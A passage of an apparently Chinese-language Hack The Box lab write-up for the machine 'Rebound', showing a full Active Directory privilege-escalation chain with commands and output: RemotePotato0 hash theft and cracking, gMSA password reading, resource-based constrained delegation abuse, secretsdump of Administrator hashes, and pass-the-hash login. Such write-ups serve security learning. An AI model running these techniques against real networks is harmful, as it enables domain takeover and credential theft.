+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\w</span>inrm_svc<span class="se">\D</span>ocuments&gt; ./RemotePotato0.exe -m <span class="m">2</span> -x 10.10.16.4 -p <span class="m">9999</span> -s <span class="m">1</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Detected a Windows Server version not compatible with JuicyPotato. RogueOxidResolver must be run remotely. Remember to forward tcp port <span class="m">135</span> on <span class="o">(</span>null<span class="o">)</span> to your victim machine on port <span class="m">9999</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Example Network redirector:
+</span></span><span class="line"><span class="cl">        sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:<span class="o">{{</span>ThisMachineIp<span class="o">}}</span>:9999
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Starting the RPC server to capture the credentials <span class="nb">hash</span> from the user authentication!!
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Spawning COM object in the session: <span class="m">1</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Calling StandardGetInstanceFromIStorage with CLSID:<span class="o">{</span>5167B42F-C111-47A1-ACC4-8EABE61B0B54<span class="o">}</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> RPC relay server listening on port <span class="m">9997</span> ...
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Starting RogueOxidResolver RPC Server listening on port <span class="m">9999</span> ...
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> IStoragetrigger written: <span class="m">102</span> bytes
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> ServerAlive2 RPC Call
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> ResolveOxid2 RPC call
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Received the relayed authentication on the RPC relay server on port <span class="m">9997</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Connected to RPC Server 127.0.0.1 on port <span class="m">9999</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> User <span class="nb">hash</span> stolen!
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">NTLMv2 Client   : DC01
+</span></span><span class="line"><span class="cl">NTLMv2 Username : rebound<span class="se">\t</span>brady
+</span></span><span class="line"><span class="cl">NTLMv2 Hash     : tbrady::rebound:e97a1b39652728fb:e7de7b31c46c060ba15e4c197019b6d6:01010000000000002015b825b5a7db01bd4ef92613923e4b0000000002000e007200650062006f0075006e006400010008004400430030003100040016007200650062006f0075006e0064002e006800740062000300200064006300300031002e007200650062006f0075006e0064002e00680074006200050016007200650062006f0075006e0064002e00680074006200070008002015b825b5a7db0106000400060000000800300030000000000000000100000000200000983f8d22b56135b0497c1eb14cb9d8533a1bba4769ea4e3c611067cab032f0c50a00100000000000000000000000000000000000090000000000000000000000
+</span></span></code></pre></div><p>将结果保存至<code>ntlm_hash</code>文件中，使用<code>john</code>破解一下</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">john ntlm_hash --wordlist<span class="o">=</span>/usr/share/wordlists/rockyou.txt
+</span></span><span class="line"><span class="cl">Using default input encoding: UTF-8
+</span></span><span class="line"><span class="cl">Loaded <span class="m">1</span> password <span class="nb">hash</span> <span class="o">(</span>netntlmv2, NTLMv2 C/R <span class="o">[</span>MD4 HMAC-MD5 32/64<span class="o">])</span>
+</span></span><span class="line"><span class="cl">Will run <span class="m">2</span> OpenMP threads
+</span></span><span class="line"><span class="cl">Press <span class="s1">&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span class="k">for</span> status
+</span></span><span class="line"><span class="cl">543BOMBOMBUNmanda <span class="o">(</span>tbrady<span class="o">)</span>
+</span></span><span class="line"><span class="cl">1g 0:00:00:17 DONE <span class="o">(</span>2025-04-07 20:00<span class="o">)</span> 0.05668g/s 691025p/s 691025c/s 691025C/s 5442657..5435844
+</span></span><span class="line"><span class="cl">Use the <span class="s2">&#34;--show --format=netntlmv2&#34;</span> options to display all of the cracked passwords reliably
+</span></span><span class="line"><span class="cl">Session completed.
+</span></span></code></pre></div><p>成功！拿到用户名密码</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">username: tbrady
+</span></span><span class="line"><span class="cl">password: 543BOMBOMBUNmanda
+</span></span></code></pre></div><p>验证一下</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">nxc ldap 10.10.11.231 -u tbrady -p 543BOMBOMBUNmanda
+</span></span><span class="line"><span class="cl">SMB         10.10.11.231    <span class="m">445</span>    DC01             <span class="o">[</span>*<span class="o">]</span> Windows <span class="m">10</span> / Server <span class="m">2019</span> Build <span class="m">17763</span> x64 <span class="o">(</span>name:DC01<span class="o">)</span> <span class="o">(</span>domain:rebound.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+</span></span><span class="line"><span class="cl">LDAPS       10.10.11.231    <span class="m">636</span>    DC01             <span class="o">[</span>-<span class="o">]</span> rebound.htb<span class="se">\t</span>brady:543BOMBOMBUNmanda
+</span></span><span class="line"><span class="cl">LDAPS       10.10.11.231    <span class="m">636</span>    DC01             <span class="o">[</span>-<span class="o">]</span> LDAPS channel binding might be enabled, this is only supported with kerberos authentication. Try using <span class="s1">&#39;-k&#39;</span>.
+</span></span></code></pre></div><p>还是要票据</p>
+<p>先同步时间，在请求票据</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">ntpdate -s rebound.htb
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">impacket-getTGT <span class="s1">&#39;rebound.htb&#39;</span>/<span class="s1">&#39;tbrady&#39;</span>:<span class="s1">&#39;543BOMBOMBUNmanda&#39;</span> -dc-ip 10.10.11.231
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">KRB5CCNAME</span><span class="o">=</span>tbrady.ccache
+</span></span></code></pre></div><p>再次验证</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">nxc ldap 10.10.11.231 -u tbrady -p 543BOMBOMBUNmanda -k
+</span></span><span class="line"><span class="cl">SMB         10.10.11.231    <span class="m">445</span>    DC01             <span class="o">[</span>*<span class="o">]</span> Windows <span class="m">10</span> / Server <span class="m">2019</span> Build <span class="m">17763</span> x64 <span class="o">(</span>name:DC01<span class="o">)</span> <span class="o">(</span>domain:rebound.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+</span></span><span class="line"><span class="cl">LDAPS       10.10.11.231    <span class="m">636</span>    DC01             <span class="o">[</span>+<span class="o">]</span> rebound.htb<span class="se">\t</span>brady
+</span></span></code></pre></div><p>没问题！</p>
+<h1 id="readgmsapassword">
+<a class="header-anchor" href="#readgmsapassword"></a>
+ReadGMSAPassword
+</h1><blockquote>
+<p>参考链接：https://www.thehacker.recipes/a-d/movement/dacl/readgmsapassword</p>
+</blockquote>
+<p>我们得到<code>tbrady</code>用户的凭据就可以读取<code>DELEGATOR$</code>机器账户的的<code>gMSA</code>密码，这里使用<code>nxc</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">nxc ldap 10.10.11.231 -u tbrady -p 543BOMBOMBUNmanda -k --gmsa
+</span></span><span class="line"><span class="cl">SMB         10.10.11.231    <span class="m">445</span>    DC01             <span class="o">[</span>*<span class="o">]</span> Windows <span class="m">10</span> / Server <span class="m">2019</span> Build <span class="m">17763</span> x64 <span class="o">(</span>name:DC01<span class="o">)</span> <span class="o">(</span>domain:rebound.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+</span></span><span class="line"><span class="cl">LDAPS       10.10.11.231    <span class="m">636</span>    DC01             <span class="o">[</span>+<span class="o">]</span> rebound.htb<span class="se">\t</span>brady:543BOMBOMBUNmanda
+</span></span><span class="line"><span class="cl">LDAPS       10.10.11.231    <span class="m">636</span>    DC01             <span class="o">[</span>*<span class="o">]</span> Getting GMSA Passwords
+</span></span><span class="line"><span class="cl">LDAPS       10.10.11.231    <span class="m">636</span>    DC01             Account: delegator$           NTLM: d0700a7a8e202cbad887ebf92e4d1080
+</span></span></code></pre></div><p>又拿到了<code>delegator$</code>账户的hash，继续横向</p>
+<p>先同步时间，在请求票据</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">ntpdate -s rebound.htb
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">impacket-getTGT <span class="s1">&#39;rebound.htb&#39;</span>/<span class="s1">&#39;delegator$&#39;</span> -hashes :d0700a7a8e202cbad887ebf92e4d1080 -dc-ip 10.10.11.231
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">KRB5CCNAME</span><span class="o">=</span>delegator$.ccache
+</span></span></code></pre></div><p>验证</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">nxc ldap 10.10.11.231 -u <span class="s1">&#39;delegator$&#39;</span> -H d0700a7a8e202cbad887ebf92e4d1080 -k
+</span></span><span class="line"><span class="cl">SMB         10.10.11.231    <span class="m">445</span>    DC01             <span class="o">[</span>*<span class="o">]</span> Windows <span class="m">10</span> / Server <span class="m">2019</span> Build <span class="m">17763</span> x64 <span class="o">(</span>name:DC01<span class="o">)</span> <span class="o">(</span>domain:rebound.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+</span></span><span class="line"><span class="cl">LDAPS       10.10.11.231    <span class="m">636</span>    DC01             <span class="o">[</span>+<span class="o">]</span> rebound.htb<span class="se">\d</span>elegator$
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">nxc winrm 10.10.11.231 -u <span class="s1">&#39;delegator$&#39;</span> -H d0700a7a8e202cbad887ebf92e4d1080
+</span></span><span class="line"><span class="cl">WINRM       10.10.11.231    <span class="m">5985</span>   DC01             <span class="o">[</span>*<span class="o">]</span> Windows <span class="m">10</span> / Server <span class="m">2019</span> Build <span class="m">17763</span> <span class="o">(</span>name:DC01<span class="o">)</span> <span class="o">(</span>domain:rebound.htb<span class="o">)</span>
+</span></span><span class="line"><span class="cl">WINRM       10.10.11.231    <span class="m">5985</span>   DC01             <span class="o">[</span>-<span class="o">]</span> rebound.htb<span class="se">\d</span>elegator$:d0700a7a8e202cbad887ebf92e4d1080
+</span></span></code></pre></div><p>但还是无法登录</p>
+<h1 id="再次信息收集">
+<a class="header-anchor" href="#%e5%86%8d%e6%ac%a1%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86"></a>
+再次信息收集
+</h1><p>目前为止，这已经是我们能够利用已知条件可以攻击到最深入的地方了，要想继续深入，还需要进一步对<code>delegator$</code>信息收集</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20250407162430706-1802444970.png" alt="image-20250407162420947"></p>
+<p>发现一些委托的信息，具有 <code>browser/dc01.rebound.htb</code> 的 SPN，允许为 dc01 计算机对象委派 HTTP</p>
+<p>使用<code>impacket-findDelegation</code>验证一下</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">ntpdate -s rebound.htb
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">impacket-findDelegation <span class="s1">&#39;rebound.htb&#39;</span>/<span class="s1">&#39;delegator$&#39;</span> -hashes :d0700a7a8e202cbad887ebf92e4d1080 -dc-ip 10.10.11.231 -k
+</span></span><span class="line"><span class="cl">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Getting machine hostname
+</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> CCache file is not found. Skipping...
+</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> CCache file is not found. Skipping...
+</span></span><span class="line"><span class="cl">AccountName  AccountType                          DelegationType  DelegationRightsTo     SPN Exists
+</span></span><span class="line"><span class="cl">-----------  -----------------------------------  --------------  ---------------------  ----------
+</span></span><span class="line"><span class="cl">delegator$   ms-DS-Group-Managed-Service-Account  Constrained     http/dc01.rebound.htb  No
+</span></span></code></pre></div><p>虽然没有导入票据，但是想要的已经出来了</p>
+<p>可以看到存在对 <code>http/dc01.rebound.htb</code> 的约束委托。这实质上意味着 <code>delegator$</code> 可以为 <code>dc01$</code> 上运行的 <code>http</code> 服务的任何用户（域管理员）请求 <code>TGS</code>。</p>
+<h1 id="约束委派-">
+<a class="header-anchor" href="#%e7%ba%a6%e6%9d%9f%e5%a7%94%e6%b4%be-"></a>
+约束委派 ×
+</h1><blockquote>
+<p>参考链接：https://www.thehacker.recipes/ad/movement/kerberos/delegations/constrained</p>
+</blockquote>
+<p>使用 <code>delegator$</code> 计算机帐户，可以利用约束委派 （KCD），约束委派的通常利用是使用 <code>HTTP</code> 服务的 <code>impacket-getST</code> 获取服务票证 （<code>TGS</code>），同时模拟任何用户（用于权限提升的域管理员）。</p>
+<p>但由于是约束性委派，只能通过<code>S4U2Self</code>协议生成不可转发的<code>TGT</code>，想通过<code>S4U2Proxy</code>协议时就无法通过</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">impacket-getST -dc-ip rebound.htb -spn http/dc01.rebound.htb -hashes :d0700a7a8e202cbad887ebf92e4d1080 -impersonate administrator rebound.htb/delegator
+</span></span><span class="line"><span class="cl">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Impersonating administrator
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Requesting S4U2self
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Requesting S4U2Proxy
+</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> Kerberos SessionError: KDC_ERR_BADOPTION<span class="o">(</span>KDC cannot accommodate requested option<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> Probably SPN is not allowed to delegate by user delegator or initial TGT not forwardable
+</span></span></code></pre></div><p>排查下原因</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20250407164425121-1432461749.png" alt="image-20250407164417615"></p>
+<p>发现<code>Administrator</code>有限制，但是，有一种技术允许使用 <code>RBCD</code>（基于资源的约束委派）绕过此限制</p>
+<h1 id="基于资源的约束委派-">
+<a class="header-anchor" href="#%e5%9f%ba%e4%ba%8e%e8%b5%84%e6%ba%90%e7%9a%84%e7%ba%a6%e6%9d%9f%e5%a7%94%e6%b4%be-"></a>
+基于资源的约束委派 √
+</h1><blockquote>
+<p>参考链接：</p>
+<p><a href="https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd">https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd</a></p>
+<p><a href="https://blog.netwrix.com/2022/09/29/resource-based-constrained-delegation-abuse/">https://blog.netwrix.com/2022/09/29/resource-based-constrained-delegation-abuse/</a></p>
+</blockquote>
+<p>我们可以使用 <code>RBCD</code>来滥用， 这种形式的委托允许服务委托对特定资源的访问权限，而不是委托对一整套权限的访问权限。</p>
+<p>来分析一下攻击思路：</p>
+<blockquote>
+<p>先为 <code>delegator$</code> 申请一个有效的 <code>TGT</code></p>
+<p>再设置<code>delegator$</code>用户的<code>AllowedToActOnBehalfOfOtherIdentity</code>属性，用于控制前端服务可以在基于资源的约束委派中委托给后端<code>delegator$</code> 的内容（计算机帐户有权设置自己的属性）在后端服务上设置 <code>ms-Ds-AllowedToActOnBehalfOfOtherIdentity</code> 属性时，前端服务必须在域中设置 <code>SPN</code>，所以我们该如何设置允许服务 （<code>SPN</code>） 委托给 <code>delegator$</code> 呢？要不人为的添加一个，要不使用一个已经被我们可控制的。</p>
+</blockquote>
+<blockquote>
+<p>我们无法添加计算机帐户（默认情况下具有 SPN），但是我们在最开始已经控制了<code>ldap_monitor</code>这个服务用户，就可以利用这个服务用户使用 <code>S4U2Self</code>（代表其他用户获取 <code>TGS</code>）通过 <code>S4U2Proxy</code> 在 <code>delegator$</code> 上请求可转发的 <code>TGS</code>（代表其他用户在第二服务上获取 <code>TGS</code>）。</p>
+</blockquote>
+<p>先请求<code>TGT</code>并导入环境变量中</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">ntpdate -s rebound.htb
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">impacket-getTGT <span class="s1">&#39;rebound.htb&#39;</span>/<span class="s1">&#39;delegator$&#39;</span> -hashes :d0700a7a8e202cbad887ebf92e4d1080 -dc-ip 10.10.11.231
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">KRB5CCNAME</span><span class="o">=</span>delegator$.ccache
+</span></span></code></pre></div><p>然后使用<code>rbcd</code>工具，改变<code>delegator$</code>用户的<code>AllowedToActOnBehalfOfOtherIdentity</code>属性，并再次使用<code>impacket-findDelegation</code>验证</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">impacket-rbcd -k -no-pass <span class="s1">&#39;rebound.htb&#39;</span>/<span class="s1">&#39;delegator$&#39;</span> -delegate-to <span class="s1">&#39;delegator$&#39;</span> -delegate-from <span class="s1">&#39;ldap_monitor&#39;</span> -dc-ip rebound.htb -action <span class="s1">&#39;write&#39;</span>  -use-ldaps
+</span></span><span class="line"><span class="cl">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Delegation rights modified successfully!
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> ldap_monitor can now impersonate users on delegator$ via S4U2Proxy
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Accounts allowed to act on behalf of other identity:
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span>     ldap_monitor   <span class="o">(</span>S-1-5-21-4078382237-1492182817-2568127209-7681<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">impacket-findDelegation <span class="s1">&#39;rebound.htb&#39;</span>/<span class="s1">&#39;delegator$&#39;</span> -hashes :d0700a7a8e202cbad887ebf92e4d1080 -dc-ip 10.10.11.231 -k
+</span></span><span class="line"><span class="cl">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Getting machine hostname
+</span></span><span class="line"><span class="cl">AccountName   AccountType                          DelegationType              DelegationRightsTo     SPN Exists
+</span></span><span class="line"><span class="cl">------------  -----------------------------------  --------------------------  ---------------------  ----------
+</span></span><span class="line"><span class="cl">ldap_monitor  Person                               Resource-Based Constrained  delegator$             No
+</span></span><span class="line"><span class="cl">delegator$    ms-DS-Group-Managed-Service-Account  Constrained                 http/dc01.rebound.htb  No
+</span></span></code></pre></div><p>现在 <code>ldap_monitor</code> 可以通过 <code>S4U2Proxy</code> 模拟 <code>delegator$</code> 上的任何用户</p>
+<p>接下来，我们请求<code>TGT</code>，接着请求 <code>ldap_monitor</code> 帐户的自服务票据，尝试使用该帐户模拟 <code>dc01$</code> 计算机帐户</p>
+<p>为什么不使用管理员账户呢？因为之前分析发现管理员账户无法被委派</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">impacket-getTGT <span class="s1">&#39;rebound.htb/ldap_monitor:1GR8t@$$4u&#39;</span> -dc-ip 10.10.11.231
+</span></span><span class="line"><span class="cl">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Saving ticket in ldap_monitor.ccache
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">KRB5CCNAME</span><span class="o">=</span>ldap_monitor.ccache 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">impacket-getST -spn <span class="s1">&#39;browser/dc01.rebound.htb&#39;</span> -impersonate <span class="s1">&#39;dc01$&#39;</span> <span class="s1">&#39;rebound.htb/ldap_monitor&#39;</span> -k -no-pass
+</span></span><span class="line"><span class="cl">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Impersonating dc01$
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Requesting S4U2self
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Requesting S4U2Proxy
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Saving ticket in dc01<span class="nv">$@</span>browser_dc01.rebound.htb@REBOUND.HTB.ccache
+</span></span></code></pre></div><p>申请自服务票据成功！接下来进行第二阶段的攻击</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">KRB5CCNAME</span><span class="o">=</span>dc01<span class="se">\$</span>@browser_dc01.rebound.htb@REBOUND.HTB.ccache
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">impacket-getST -spn <span class="s2">&#34;http/dc01.rebound.htb&#34;</span> -impersonate <span class="s2">&#34;dc01</span>$<span class="s2">&#34;</span> -additional-ticket <span class="s2">&#34;dc01\$@browser_dc01.rebound.htb@REBOUND.HTB.ccache&#34;</span> <span class="s2">&#34;rebound.htb/delegator</span>$<span class="s2">&#34;</span> -hashes :d0700a7a8e202cbad887ebf92e4d1080 -k -no-pass
+</span></span><span class="line"><span class="cl">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Getting TGT <span class="k">for</span> user
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Impersonating dc01$
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span>     Using additional ticket dc01<span class="nv">$@</span>browser_dc01.rebound.htb@REBOUND.HTB.ccache instead of S4U2Self
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Requesting S4U2Proxy
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Saving ticket in dc01<span class="nv">$@</span>http_dc01.rebound.htb@REBOUND.HTB.ccache
+</span></span></code></pre></div><p>获得<code>dc01</code>机器账户的票据，由于这是机器账户的票据所以我们可以直接转储</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">KRB5CCNAME</span><span class="o">=</span>dc01<span class="se">\$</span>@http_dc01.rebound.htb@REBOUND.HTB.ccache
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">impacket-secretsdump dc01.rebound.htb -k -just-dc-user Administrator
+</span></span><span class="line"><span class="cl">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Dumping Domain Credentials <span class="o">(</span>domain<span class="se">\u</span>id:rid:lmhash:nthash<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Using the DRSUAPI method to get NTDS.DIT secrets
+</span></span><span class="line"><span class="cl">Administrator:500:aad3b435b51404eeaad3b435b51404ee:176be138594933bb67db3b2572fc91b8:::
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Kerberos keys grabbed
+</span></span><span class="line"><span class="cl">Administrator:aes256-cts-hmac-sha1-96:32fd2c37d71def86d7687c95c62395ffcbeaf13045d1779d6c0b95b056d5adb1
+</span></span><span class="line"><span class="cl">Administrator:aes128-cts-hmac-sha1-96:efc20229b67e032cba60e05a6c21431f
+</span></span><span class="line"><span class="cl">Administrator:des-cbc-md5:ad8ac2a825fe1080
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Cleaning up...
+</span></span></code></pre></div><p>拿到了管理员的<code>hash</code>！</p>
+<p><strong>PS: 上面的两个spn不一定非得用这俩，也可以用CIFS或者ldap，我只是根据现有的来使用的，同样用ldap_monitor的原因是这个是目前有凭据的服务账户</strong></p>
+<h1 id="pth登录">
+<a class="header-anchor" href="#pth%e7%99%bb%e5%bd%95"></a>
+PTH登录
+</h1><p>使用<code>evil-winrm</code>直接登录</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">evil-winrm -i 10.10.11.231 -u Administrator -H 176be138594933bb67db3b2572fc91b8
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Evil-WinRM shell v3.7
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Warning: Remote path completions is disabled due to ruby limitation: undefined method <span class="sb">`</span>quoting_detection_proc<span class="err">&#39;</span> <span class="k">for</span> module Reline
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Info: Establishing connection to remote endpoint
+</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt; whoami
+</span></span><span class="line"><span class="cl">rebound<span class="se">\a</span>dministrator
+</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt;
+</span></span></code></pre></div><p>登陆成功！在<code>Desktop</code>找到<code>root.txt</code>，收工！</p></div>
+    <footer class="article-footer"><ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in">
+      <a
+        class="article-tag-list-link"
+        href="/tags/windows"
+        rel="tag"
+        >WINDOWS</a
+      >
+    </li><li class="article-tag-list-item" data-aos="zoom-in">
+      <a
+        class="article-tag-list-link"
+        href="/tags/rid-cycling"
+        rel="tag"
+        >RID CYCLING</a
+      >
+    </li><li class="article-tag-list-item" data-aos="zoom-in">
+      <a
+        class="article-tag-list-link"
+        href="/tags/as-rep-roasting"
+        rel="tag"
+        >AS-REP ROASTING</a
+      >
+    </li><li class="article-tag-list-item" data-aos="zoom-in">
+      <a
+        class="article-tag-list-link"
+        href="/tags/kerberoasting"
+        rel="tag"
+        >KERBEROASTING</a
+      >
+    </li><li class="article-tag-list-item" data-aos="zoom-in">
+      <a
+        class="article-tag-list-link"
+        href="/tags/shadow-credentials"
+        rel="tag"
+        >SHADOW CREDENTIALS</a
+      >
+    </li><li class="article-tag-list-item" data-aos="zoom-in">
+      <a
+        class="article-tag-list-link"
+        href="/tags/acl-abuse"
+        rel="tag"
+        >ACL ABUSE</a
+      >
+    </li><li class="article-tag-list-item" data-aos="zoom-in">
+      <a
+        class="article-tag-list-link"
+        href="/tags/remotepotato0"
+        rel="tag"
+        >REMOTEPOTATO0</a
+      >
+    </li><li class="article-tag-list-item" data-aos="zoom-in">
+      <a
+        class="article-tag-list-link"
+        href="/tags/dacl-abuse"
+        rel="tag"
+        >DACL ABUSE</a
+      >
+    </li><li class="article-tag-list-item" data-aos="zoom-in">
+      <a
+        class="article-tag-list-link"
+        href="/tags/rbcd"
+        rel="tag"
+        >RBCD</a
+      >
+    </li></ul>
+</footer>
+  </div><nav
+    id="article-nav"
+    aria-label="Article navigation"
+    data-aos="fade-up"
+  ><div class="article-nav-link-wrap left"><img
+              data-src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/covers/default_cover_71.webp"
+              data-sizes="auto"
+              alt="HTB Manager"
+              class="lazyload"
+            /><a
+          href="/post/htb-manager/"
+          aria-label="前一篇:HTB Manager"
+          title="前一篇:HTB Manager"
+        ></a>
+        <div class="article-nav-caption">前一篇</div>
+        <h3 class="article-nav-title">HTB Manager</h3>
+      </div><div class="article-nav-link-wrap right"><img
+              data-src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/covers/default_cover_16.webp"
+              data-sizes="auto"
